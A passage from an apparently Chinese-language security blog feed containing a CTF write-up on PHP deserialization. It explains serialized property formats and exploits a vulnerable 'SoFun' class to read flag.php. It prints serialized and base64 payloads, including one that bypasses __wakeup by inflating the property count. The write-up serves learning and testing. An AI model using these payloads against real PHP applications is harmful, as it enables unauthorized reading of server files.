class="string">"private"</span>;s:<span class="number">4</span>:<span class="string">"\00*\00b"</span>;s:<span class="number">9</span>:<span class="string">"protected"</span>;s:<span class="number">1</span>:<span class="string">"c"</span>;s:<span class="number">6</span>:<span class="string">"public"</span>;&#125;</div><div class="line">\\<span class="keyword">private</span>属性序列化后:数据类型:属性名长度:<span class="string">"\00类名\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">\\<span class="keyword">protected</span>属性序列化后:数据类型:属性名长度:<span class="string">"\00*\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">\\<span class="keyword">public</span>属性序列化后:数据类型:属性名长度:<span class="string">"属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div></pre></td></tr></table></figure><p><strong>其中常见的php数据类型对应的字母标识如下</strong></p><pre><code>a - arrayb - booleand - doublei - integero - common objectr - references - non-escaped binary stringS - escaped binary stringC - custom objectO - classN - nullR - pointer referenceU - unicode string</code></pre><p><strong>接着看上面的那道题,代码很明显存在php反序列化漏洞,题目要求利用php反序列化漏洞去读取与<code>index.php</code>同一目录下的<code>flag.php</code>,代码流程很简单,就是将传入的<code>$_GET[&#39;file&#39;]</code>参数经过base64解码后再进行反序列化,如果处理结果是该对象的一个序列化字符串,在进行反序列化的时候就会触发该对象的<code>__wakeup</code>方法,并在代码结束时触发该对象的<code>__destruct</code>方法,此时对象当中的<code>$file</code>变量被传入<code>show_source</code>,如果<code>$file</code>是一个文件名,就会显示出对应文件的源代码,<code>$file</code>变量又刚好是可控的,很容易构造出读取<code>flag.php</code>的payload</strong></p><p><strong>构造序列化字符串,设置对象的<code>protected</code>属性$file的值为<code>flag.php</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</div></pre></td></tr></table></figure><p><strong>再经过base64编码</strong></p><pre><code>Tzo1OiJTb0Z1biI6MTp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9</code></pre><p><strong>将得到的base64字符串传入<code>$_GET[&#39;file&#39;]</code>,但是看到并没有显示出<code>flag.php</code>的源码,这里依旧显示的是<code>index.php</code>的源代码,原因就是传入的序列化字符串在反序列化的时候会触发对象的<code>__wakeup</code>魔术方法,而在<code>__wakeup</code>魔术方法中,将传入的<code>$file</code>属性值设置成了<code>index.php</code>,之后触发<code>__destruct</code>方法时,<code>$file</code>的值就变为了<code>index.php</code>,所以这里需要绕过<code>__wakeup</code>函数,这里需要利用<code>__wakeup</code>函数的一个漏洞</strong></p><h3 id="wakeup-函数漏洞"><a href="#wakeup-函数漏洞" class="headerlink" title="wakeup()函数漏洞"></a>wakeup()函数漏洞</h3><p><strong>当序列化字符串当中属性个数值大于实际的属性个数时,就会导致反序列化异常,从而跳过<code>__wakeup</code>函数,具体的底层原理可以看下面的解释</strong><br><img src="http://pic.c1imber.top/blog/181031/J0bm2IaaCc.png?imageslim" alt="mark"></p><p><strong>那么就可以构造序列化字符串</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</div></pre></td></tr></table></figure><p><strong>将对象属性的个数设置为2,而实际的属性个数为1,使其反序列化产生异常,从而绕过<code>__wakeup</code>函数，将序列化字符串进行base64编码后</strong></p><pre><code>Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</code></pre><p><strong>成功读取到了<code>flag.php</code>的源码</strong><br><img src="http://pic.c1imber.top/blog/181031/hIkKA7Ag38.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PHP反序列化漏洞学习-绕过-wakeup-函数&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞学习-绕过-wakeup-函数&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞学习-绕过_wakeup()函数&quot;&gt;&lt;/a&gt;PHP反序列化漏洞学习-绕过_wakeup()函数&lt;/h1&gt;&lt;h3 id=&quot;题目代码&quot;&gt;&lt;a href=&quot;#题目代码&quot; class=&quot;headerlink&quot; title=&quot;题目代码&quot;&gt;&lt;/a&gt;题目代码&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;代码如下，要求利用php反序列化漏洞去读取&lt;code&gt;flag.php&lt;/code&gt;文件中的内容&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;SoFun&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; $file=&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file)) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strchr(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt; file,&lt;span class=&quot;string&quot;&gt;&quot;\\&quot;&lt;/span&gt;)===&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt; &amp;amp;&amp;amp;  strchr(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file, &lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;)===&lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          show_source(dirname (&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt; -&amp;gt;file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;      &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Wrong filename.&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__wakeup&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123; &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt; file=&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;; &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__toString&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; ;&amp;#125;&amp;#125;     &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]))&amp;#123; show_source(&lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;); &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       $file=base64_decode( $_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;]); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; unserialize($file ); &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;#&amp;lt;!--key in flag.php--&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
